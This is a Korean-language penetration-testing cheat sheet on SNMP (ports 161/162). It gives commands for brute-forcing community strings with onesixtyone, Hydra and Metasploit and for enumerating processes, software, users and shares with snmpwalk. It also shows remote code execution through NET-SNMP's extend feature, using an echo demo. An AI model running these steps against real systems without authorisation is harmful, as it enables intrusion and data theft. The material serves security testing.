---
sidebar_position: 5
title: SNMP (Port 161/162)
---

# SNMP (Port 161/162) 취약점 진단

## Overview

**SNMP (Simple Network Management Protocol)**: 라우터, 스위치, 서버 등 네트워크 장비의 상태 모니터링 및 관리를 위한 프로토콜

**주요 포트 및 버전**:
- **161/UDP**: SNMP Agent (정보 요청)
- **162/UDP**: SNMP Trap (이벤트 알림)
- **지원 버전**: v1, v2c (평문 통신, 보안 취약), v3 (인증 및 암호화 지원)
- **Community String**: 패스워드 역할. `public`(기본 읽기), `private`(기본 쓰기)

---

## 1. Reconnaissance

### Community String 스캔 및 브루트포스
```bash
# [Nmap] 기본 SNMP 포트 열림 확인 및 정보 수집
nmap -sU -p 161 --script snmp-info <target>

# [onesixtyone] 초고속 Community String 브루트포스 스캐너
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# [Hydra] 브루트포스 공격을 통한 Community String 탐색
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target> snmp
```

### snmp-check를 이용한 자동 열거
가장 핵심적인 정보(시스템, 네트워크, 사용자, 프로세스 등)를 스크립트로 일괄 수집
```bash
# 기본 커뮤니티(public)로 자동 스캔
snmp-check <target>

# 특정 커뮤니티 지정
snmp-check -c private <target>
```

---

## 2. Exploitation

### snmpwalk를 활용한 수동 MIB 트리 조회 (SNMP v1/v2c)
```bash
# 기본 시스템 트리 전체 조회
snmpwalk -v2c -c public <target>

# 특정 MIB (시스템 상세 정보) 조회
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1  # 시스템 설명(OS, 커널 등)
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.5  # 호스트 이름
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.4  # 관리자 연락처
```

### 주요 민감 정보 열거
```bash
# 네트워크 인터페이스 및 라우팅 정보
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.2.2.1.2   # 인터페이스
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.20.1.1  # 할당된 IP 주소

# 실행 중인 프로세스 및 설치된 소프트웨어
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2  # 프로세스 목록
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2  # 설치된 소프트웨어

# [Windows 타겟] 로컬 사용자 및 공유 폴더
snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25   # Windows 사용자
snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.27   # 공유 폴더 목록
```

### SNMP v3 인증 및 암호화 접속
```bash
# 인증(authNoPriv) 기반 열거
snmpwalk -v3 -l authNoPriv -u <user> -a SHA -A <password> <target>

# 인증 및 암호화(authPriv) 기반 열거
snmpwalk -v3 -l authPriv -u <user> -a SHA -A <auth_pass> -x AES -X <priv_pass> <target>
```

---

## 3. Advanced Techniques

### NET-SNMP Extend를 활용한 RCE
대상 서버의 커뮤니티가 쓰기 권한(`private`)을 가지고 있고, NET-SNMP의 `extend` 기능이 활성화된 경우 원격 코드 실행(RCE) 가능

```bash
# 1. 원격 명령어 삽입 (명령어 이름: command, 내용: /bin/echo 'hello world')
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private <target> \
  'nsExtendStatus."command"' = createAndGo \
  'nsExtendCommand."command"' = /bin/echo \
  'nsExtendArgs."command"' = 'hello world'

# 2. 주입한 명령어 트리거 및 결과 확인
snmpwalk -v2c -c private <target> nsExtendObjects
```

### Metasploit 자동화 모듈
```bash
# SNMP 로그인/브루트포스 모듈
use auxiliary/scanner/snmp/snmp_login
set RHOSTS <target>
set PASS_FILE /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
run

# 식별된 커뮤니티를 활용한 정보 자동 열거 모듈
use auxiliary/scanner/snmp/snmp_enum
set COMMUNITY public
run
```
